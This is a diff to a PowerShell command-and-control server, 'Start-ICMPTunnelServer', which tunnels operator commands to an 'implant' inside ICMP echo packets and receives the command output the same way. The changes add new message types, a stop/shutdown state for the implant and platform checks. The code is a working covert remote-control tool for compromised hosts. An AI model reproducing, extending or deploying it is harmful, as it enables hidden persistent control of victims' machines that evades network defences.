@@ -1,31 +1,35 @@
 Import-Module ReadLineWithHistory;
 
-enum ImplantMessageType {
-	Prompt = 0
-	NeedsInstruction = 1
-	CommandResultPart = 2
-	CommandResultEnd = 3
+Enum ImplantMessageType {
+	Prompt = 1
+	NeedsInstruction = 3
+	CommandResultPart = 5
+	CommandResultEnd = 7
+	Stopping = 9
+	Sync = 11
 }
 
-enum ServerMessageType {
-	NeedsPrompt = 34
-	IssuingCommand = 9
-	Stop = 2
-	Received = 7
+Enum ServerMessageType {
+	NeedsPrompt = 0
+	IssuingCommand = 2
+	Stop = 4
+	Received = 6
+	Sync = 8
 }
 
-enum ServerState {
-	WaitingForPrompt = 0
-	EnteringCommand = 1
-	WaitingToReplyWithCommand = 2
-	ReceivingCommandResult = 3
+Enum ServerState {
+	WaitingForPrompt
+	EnteringCommand
+	WaitingToReplyWithCommand
+	ReceivingCommandResult
+	Stopping
 }
 
 <#
   .Description
   Binds to the specified IP address and listens for ICMP Tunnel packets from an ICMP Tunnel implant.
 #>
-function Start-ICMPTunnelServer {
+Function Start-ICMPTunnelServer {
 	[CmdletBinding()]
 	Param (
 		[Parameter()]
@@ -56,6 +60,13 @@ public static class LIBC
 			Return;
 		}
 	}
+	ElseIf ($IsWindows) {
+		Write-Host "Windows ICMP Tunnel Server has not yet been implemented.";
+		Return;
+	}
+	ElseIf ($IsMacOS) {
+		Write-Host "Not yet tested on MacOS. Good luck!";
+	}
 
 	# Initialize socket and bind
 	Try {
@@ -63,7 +74,7 @@ public static class LIBC
 	}
 	Catch {
 		If ($_.Exception.InnerException.ErrorCode -eq 13) {
-			Write-Host "Permission to intercept ICMP packets was denied. Try again with root or admin permissions.";
+			Write-Host "Permission to intercept ICMP packets was denied.";
 			Return;
 		}
 	}
@@ -74,43 +85,46 @@ public static class LIBC
 
 	[ServerState]$State = [ServerState]::WaitingForPrompt;
 
-	function Receive-ICMPMessage {
-		# .Description
-		# Checks for an ICMP Echo Request from anyone and returns the ICMP header, ImplantMessageType, message data, and the IPEndpoint. 
-
+	<#
+		.Description
+		Checks for an ICMP Echo Request from anyone and returns the ICMP header, ImplantMessageType, message data, and the IPEndpoint. 
+	#>
+	Function Receive-ICMPMessage {
 		$Buffer = New-Object Byte[] ($BufferSize);
 		$Endpoint = New-Object Net.IPEndpoint([Net.IPAddress]::Any, 0);
 		$IPPacketInformation = New-Object Net.Sockets.IPPacketInformation;
 
 		$ByteCount = 0;
-		try {
+		Try {
 			# Checking for an ICMP packet from any IP.
 			$ByteCount = $ICMPSocket.ReceiveMessageFrom($Buffer, 0, $BufferSize, [ref][System.Net.Sockets.SocketFlags]::None, [ref]$Endpoint, [ref]$IPPacketInformation);
 		}
-		catch { return $null; }
-		if ($ByteCount -eq 0) { return $null; }
+		Catch { Return $null; }
+		If ($ByteCount -eq 0) { Return $null; }
 
 		# Finding the end of the IP header and checking the ICMP type.
 		$IPHeaderSize = ($Buffer[0] -band 0x0f) * 4;
 		$ICMPType = $Buffer[$IPHeaderSize];
-		if ($ICMPType -ne 8) { return $null; }
+		If ($ICMPType -ne 8) { Return $null; }
 
 		# Stripping off the IP header.
 		[Byte[]]$ICMPHeader = $Buffer[$IPHeaderSize..($IPHeaderSize + 7)];
-		if ($ByteCount -lt $IPHeaderSize + 8) { return $null; }
+		If ($ByteCount -lt $IPHeaderSize + 8) { Return $null; }
 
 		# Grabbing the ImplantMessageType and message data
 		[ImplantMessageType]$MessageType = $Buffer[$IPHeaderSize + 8];
-		$MessageData = if ($ByteCount -lt $IPHeaderSize + 9) { $null } else { $Buffer[($IPHeaderSize + 9)..($ByteCount - 1)] };
+		$MessageData = If ($ByteCount -lt $IPHeaderSize + 9) { $null } Else { $Buffer[($IPHeaderSize + 9)..($ByteCount - 1)] };
 
-		return ($ICMPHeader, $MessageType, $MessageData, $Endpoint);
+		Return ($ICMPHeader, $MessageType, $MessageData, $Endpoint);
 	}
 
-	# .Description
-	# Sends an ICMP Echo Reply to the specified IPEndpoint with the specified ServerMessageType and a command string if relevant.
-	function Send-ICMPMessage {
+	<#
+		.Description
+		Sends an ICMP Echo Reply to the specified IPEndpoint with the specified ServerMessageType and a command string If relevant.
+	#>
+	Function Send-ICMPMessage {
 		[CmdletBinding()]
-		param (
+		Param (
 			[Parameter(Mandatory)]
 			[Byte[]]
 			$ICMPHeader,
@@ -129,7 +143,7 @@ public static class LIBC
 		)
 
 		#Constructing the Echo Reply packet
-		if ($null -eq $Command) { $Command = '' }
+		If ($null -eq $Command) { $Command = '' }
 		$EchoReply = @(0, 0, 0, 0) + $ICMPHeader[4..7] + $MessageType + [Text.Encoding]::UTF8.GetBytes($Command);
 
 		# Calculating the checksum of the Echo Reply (ones' complement of the ones' complement sum of every 16 bits)
@@ -150,11 +164,11 @@ public static class LIBC
 	$Prompt = $null
 	$Reader = New-ReadLineWithHistory;
 	Write-Host "ICMP Tunnel Server started! Waiting for a connection..."
-	while ($True) {
+	While ($True) {
 		Switch ($State) {
 			WaitingForPrompt {
         ($ICMPHeader, $MessageType, $MessageData, $Endpoint) = Receive-ICMPMessage;
-				if ($null -eq $ICMPHeader) { Continue; }
+				If ($null -eq $ICMPHeader) { Continue; }
 
 				# TODO: add check for sync message.
 
@@ -178,12 +192,19 @@ public static class LIBC
 			}
 			WaitingToReplyWithCommand {
         ($ICMPHeader, $MessageType, $MessageData, $Endpoint) = Receive-ICMPMessage;
-				if ($null -eq $ICMPHeader) { Continue; }
+				If ($null -eq $ICMPHeader) { Continue; }
 
 				Switch ($MessageType) {
 					NeedsInstruction {
-						Send-ICMPMessage -ICMPHeader $ICMPHeader -Endpoint $Endpoint -MessageType IssuingCommand -Command $CommandToSend;
-						$State = [ServerState]::ReceivingCommandResult;
+						If ($CommandToSend -ieq "quit" -or $CommandToSend -ieq "exit" -or $CommandToSend -ieq "stop") {
+							Send-ICMPMessage -ICMPHeader $ICMPHeader -Endpoint $Endpoint -MessageType Stop;
+							Write-Host "Gracefully shutting down implant...";
+							$State = [ServerState]::Stopping;
+						}
+						Else {
+							Send-ICMPMessage -ICMPHeader $ICMPHeader -Endpoint $Endpoint -MessageType IssuingCommand -Command $CommandToSend;
+							$State = [ServerState]::ReceivingCommandResult;
+						}
 						Break;
 					}
 				}
@@ -191,7 +212,7 @@ public static class LIBC
 			}
 			ReceivingCommandResult {
         ($ICMPHeader, $MessageType, $MessageData, $Endpoint) = Receive-ICMPMessage;
-				if ($null -eq $ICMPHeader) { Continue; }
+				If ($null -eq $ICMPHeader) { Continue; }
 
 				Switch ($MessageType) {
 					CommandResultPart {
@@ -211,6 +232,16 @@ public static class LIBC
 					}
 				}
 				Break;
+			}
+			Stopping {
+				($ICMPHeader, $MessageType, $MessageData, $Endpoint) = Receive-ICMPMessage;
+				If ($null -eq $ICMPHeader) { Continue; }
+				Switch ($MessageType) {
+					Stopping {
+						Write-Host "Bye!";
+						Return;
+					}
+				}
 			}
 		}
 	}
